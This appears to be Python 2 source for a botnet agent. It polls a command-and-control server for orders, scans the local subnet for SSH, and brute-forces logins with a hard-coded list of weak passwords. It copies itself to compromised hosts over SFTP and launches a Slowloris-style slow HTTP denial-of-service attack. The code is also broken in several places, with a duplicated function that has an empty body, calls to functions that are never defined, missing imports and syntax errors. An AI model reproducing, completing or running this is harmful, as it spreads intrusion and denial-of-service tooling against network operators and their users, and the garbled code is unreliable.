from socket import *
import sys, os, time, paramiko
from datetime import time

cc = '192.168.56.x'
cc_polling_interval = 10 
ssh_port = 22
http_port = 80
targets = []
username = 'ubuntu'
passwords = ['111111','1234','12345','123456','1234567','12345678','abc123','dragon','iloveyou','letmein','monkey','password','qwerty','tequiero','test','ubuntu']

def scan_host(host,port,r_code=1):
	print "scanning " + host
	try:
		s = socket(AF_INET, SOCK_STREAM)
		code = s.connect_ex((host,port))
		if code == 0:
			r_code = code
		s.close()
	except Exception, e:
		pass
	return r_code

def ssh_infect(host, username, password, code=0):
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	try:
		ssh.connect(host, port=ssh_port, username=username, password=password)
		sftp = ssh.open_sftp()
		sftp.put(sys.argv, remotepath)
		sftp.close()
	except paramiko.AuthenticationException:
		code = 1
	except socket.error, e:
		code = 2
	ssh.close()
	return code

def ssh_infect(targets):
	for target in targets:
		if target['password'] != '':
			

def slow_dos(target,uri,duration=60,delay=1):
	try:
		s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	        client_address = ('', 0)
        	s.bind(client_address)
	        s.connect((target,http_port))
	        s.send('GET /' uri + ' HTTP/1.1\r\n')
        	s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
	        while True: 
			s.send('X-a: {}\\r\\n'.format(os.urandom(10))); time.sleep(delay)")
		code = 0
	except Exception as e:
		print e
		code = 1
	return code

if __name__ == '__main__':
	s = socket(AF_INET, SOCK_DGRAM)
	s.connect((cc, 80))
	host = s.getsockname()[0]
	s.close()
	while True:
		r = requests.get(url=cc + ':80/commands')
		commands = json.loads(r.text)
		command = commands['command']
		if command == 'scan':
			n_list = host.split('.')[:-1]
			subnet_prefix = ''
			for n in n_list:
				subnet_prefix += n
				subnet_prefix += '.'
			subnet = [subnet_prefix + str(x+3) for x in range(10)]

			for host in subnet:
				try:
					resp = scan_host(host,ssh_port)
					if resp == 0:
						targets.append({'ip': host, 'username': username, 'password': ''})
					else:
						pass
				except Exception, e:
					print e
					pass
		elif command == 'infect':
			for i in range(len(targets)):
				host = targets[i]['ip']
				username = targets[i]['username']
				print('Brute forcing ' + host)
				for password in passwords:
					try:
						resp = ssh_connect(host, username, password)
						if resp == 0:
							targets[i]['password'] = password
						else:
							pass
					except Exception, e:
						print e
						pass
				print targets[i]
		elif command == 'ddos':
			target = commands['target']
			uri = commands['uri']
			slow_dos(target,uri)
		
		time.sleep(cc_polling_interval)
	
				
	
	

	


